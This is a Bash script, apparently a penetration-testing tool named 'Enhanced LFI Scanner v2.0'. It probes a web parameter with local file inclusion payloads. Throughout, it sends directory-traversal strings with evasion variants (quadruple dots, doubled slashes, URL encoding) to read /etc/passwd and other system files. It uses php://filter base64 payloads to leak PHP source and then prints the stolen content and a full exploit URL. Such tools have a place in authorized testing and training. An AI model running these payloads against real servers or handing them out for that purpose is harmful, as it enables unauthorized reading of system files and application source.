#!/bin/bash

# Enhanced LFI Scanner v2.0
# Now analyzes the URL to detect patterns

URL="$1"
PARAM="$2"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

TEMP_DIR="/tmp/lfi_scan_$$"
mkdir -p "$TEMP_DIR"

# Banner
echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║         LFI Vulnerability Scanner v2.0                 ║${NC}"
echo -e "${BLUE}║         Smart Pattern Detection                        ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}"
echo ""

# Extract current parameter value to detect patterns
echo -e "${YELLOW}[*] Analyzing URL for patterns...${NC}"

# Parse the URL to get current parameter value
if [[ "$URL" =~ $PARAM=([^&]+) ]]; then
    CURRENT_VALUE="${BASH_REMATCH[1]}"
    echo -e "${YELLOW}[*] Current parameter value: ${CURRENT_VALUE}${NC}"
    
    # Detect if there's a directory prefix
    if [[ "$CURRENT_VALUE" =~ ^([^/]+/) ]]; then
        PREFIX="${BASH_REMATCH[1]}"
        echo -e "${YELLOW}[*] Detected prefix pattern: ${PREFIX}${NC}"
    else
        PREFIX=""
        echo -e "${YELLOW}[*] No prefix detected${NC}"
    fi
else
    PREFIX=""
    echo -e "${YELLOW}[!] Could not parse current value${NC}"
fi

echo ""

make_request() {
    local payload="$1"
    local output_file="$2"
    local full_url
    
    # Remove existing parameter and add ours
    base_url="${URL%%\?*}"
    full_url="${base_url}?${PARAM}=${payload}"
    
    curl -s -L "$full_url" -o "$output_file" 2>/dev/null
    return $?
}

check_success() {
    local file="$1"
    local target="$2"
    
    case "$target" in
        *"passwd"*)
            grep -q "root:.*:0:0:" "$file" && return 0
            grep -q "daemon:" "$file" && return 0
            ;;
        *"hosts"*)
            grep -q "127.0.0.1" "$file" && return 0
            ;;
    esac
    
    return 1
}

# Test basic LFI
echo -e "${BLUE}[PHASE 1] Testing Basic LFI${NC}"
echo "=========================================="

basic_payloads=(
    "../../../../etc/passwd"
    "../../../../../etc/passwd"
    "../../../../../../etc/passwd"
    "../../../../../../../etc/passwd"
)

for payload in "${basic_payloads[@]}"; do
    echo -e "${YELLOW}[*] Testing: ${payload}${NC}"
    make_request "$payload" "${TEMP_DIR}/basic.html"
    
    if check_success "${TEMP_DIR}/basic.html" "passwd"; then
        echo -e "${GREEN}[✓] SUCCESS! Basic LFI works${NC}"
        echo -e "${GREEN}[✓] Working payload: ${payload}${NC}"
        exit 0
    fi
done

echo -e "${RED}[✗] Basic LFI unsuccessful${NC}"
echo ""

# Phase 2: Smart bypass with detected prefix
echo -e "${BLUE}[PHASE 2] Testing Bypasses with Pattern Detection${NC}"
echo "=========================================="

# Generate bypass payloads with multiple depths and prefix variations
declare -a SMART_BYPASSES=()

# Test depths from 3 to 8 traversals
for depth in {3..8}; do
    # Build traversal string
    traversal=""
    for ((i=1; i<=depth; i++)); do
        traversal="${traversal}..../"
    done
    
    # Try different combinations
    if [ -n "$PREFIX" ]; then
        # With detected prefix
        SMART_BYPASSES+=("prefix_${depth}:${PREFIX}${traversal}/etc/passwd")
        SMART_BYPASSES+=("prefix_dot_${depth}:./${PREFIX}${traversal}/etc/passwd")
        
        # Also try with // instead of /
        traversal_double="${traversal//\//\/\/}"
        SMART_BYPASSES+=("prefix_double_${depth}:${PREFIX}${traversal_double}etc//passwd")
    fi
    
    # Without prefix
    SMART_BYPASSES+=("no_prefix_${depth}:${traversal}/etc/passwd")
    
    # URL encoded versions
    traversal_encoded=$(echo -n "$traversal" | sed 's/\.\./\%2e\%2e/g' | sed 's/\//\%2f/g')
    SMART_BYPASSES+=("encoded_${depth}:${traversal_encoded}etc%2fpasswd")
done

success=0
working_payload=""

for technique in "${SMART_BYPASSES[@]}"; do
    IFS=':' read -r name payload <<< "$technique"
    output_file="${TEMP_DIR}/${name}.html"
    
    echo -e "${YELLOW}[*] Trying: ${name}${NC}"
    echo -e "    Payload: ${payload}"
    
    make_request "$payload" "$output_file"
    
    if check_success "$output_file" "passwd"; then
        echo -e "${GREEN}[✓] SUCCESS with ${name}!${NC}"
        working_payload="$payload"
        success=1
        
        # Show the actual content
        echo -e "${GREEN}[*] Retrieved content:${NC}"
        grep -A 5 "root:" "$output_file" | head -10
        
        break
    fi
done

echo ""

# Phase 3: Alternative files (only if still unsuccessful)
if [ $success -eq 0 ]; then
    echo -e "${BLUE}[PHASE 3] Testing Alternative Files${NC}"
    echo "=========================================="
    
    alt_files=("etc/hosts" "etc/hostname" "proc/version")
    
    for file in "${alt_files[@]}"; do
        echo -e "${YELLOW}[*] Testing: /${file}${NC}"
        
        # Try with detected prefix if available
        if [ -n "$PREFIX" ]; then
            for depth in {3..6}; do
                traversal=""
                for ((i=1; i<=depth; i++)); do
                    traversal="${traversal}..../"
                done
                
                payload="${PREFIX}${traversal}/${file}"
                make_request "$payload" "${TEMP_DIR}/alt_${file//\//_}.html"
                
                if check_success "${TEMP_DIR}/alt_${file//\//_}.html" "$file"; then
                    echo -e "${GREEN}[✓] SUCCESS with /${file}!${NC}"
                    working_payload="$payload"
                    success=1
                    break 2
                fi
            done
        fi
    done
fi

echo ""

# Phase 4: PHP Filters
if [ $success -eq 0 ]; then
    echo -e "${BLUE}[PHASE 4] Testing PHP Filters${NC}"
    echo "=========================================="
    
    php_payloads=(
        "php://filter/read=convert.base64-encode/resource=index"
        "php://filter/read=convert.base64-encode/resource=config"
    )
    
    if [ -n "$PREFIX" ]; then
        # Extract just the directory part (remove trailing /)
        dir_prefix="${PREFIX%/}"
        php_payloads+=(
            "php://filter/read=convert.base64-encode/resource=${dir_prefix}/en"
            "php://filter/read=convert.base64-encode/resource=${dir_prefix}/es"
        )
    fi
    
    for payload in "${php_payloads[@]}"; do
        echo -e "${YELLOW}[*] Testing: ${payload}${NC}"
        make_request "$payload" "${TEMP_DIR}/php_filter.html"
        
        if grep -qE '[A-Za-z0-9+/]{50,}={0,2}' "${TEMP_DIR}/php_filter.html"; then
            base64_content=$(grep -oE '[A-Za-z0-9+/]{50,}={0,2}' "${TEMP_DIR}/php_filter.html" | head -1)
            decoded=$(echo "$base64_content" | base64 -d 2>/dev/null)
            
            if echo "$decoded" | grep -q "<?php"; then
                echo -e "${GREEN}[✓] SUCCESS! PHP source disclosed${NC}"
                echo -e "${YELLOW}Preview:${NC}"
                echo "$decoded" | head -10
                working_payload="$payload"
                success=1
                break
            fi
        fi
    done
fi

echo ""

# Final Report
echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║                    FINAL REPORT                        ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}"
echo ""

if [ $success -eq 1 ]; then
    echo -e "${GREEN}[✓✓✓] LFI VULNERABILITY CONFIRMED [✓✓✓]${NC}"
    echo ""
    echo -e "${GREEN}Working Payload:${NC}"
    echo -e "  ${working_payload}"
    echo ""
    
    # Build full URL
    base_url="${URL%%\?*}"
    full_exploit="${base_url}?${PARAM}=${working_payload}"
    
    echo -e "${GREEN}Full Exploit URL:${NC}"
    echo -e "  ${full_exploit}"
    echo ""
    echo -e "${YELLOW}Test with curl:${NC}"
    echo -e "  curl '${full_exploit}'"
    echo ""
    echo -e "${YELLOW}Detected Pattern:${NC}"
    echo -e "  Prefix: ${PREFIX:-"none"}"
    echo -e "  Traversal depth: $(echo "$working_payload" | grep -o '\.\.\.\./' | wc -l)"
else
    echo -e "${RED}[✗✗✗] NO LFI VULNERABILITY DETECTED [✗✗✗]${NC}"
    echo ""
    echo -e "${YELLOW}Suggestions:${NC}"
    echo "  1. Try manual testing with different depths"
    echo "  2. Check if there are other parameters"
    echo "  3. Use ZAP/Burp for interactive testing"
    echo "  4. Try: curl '${URL%%\?*}?${PARAM}=languages/....//....//....//....//....//etc//passwd'"
fi

rm -rf "$TEMP_DIR"
exit $([ $success -eq 1 ] && echo 0 || echo 1)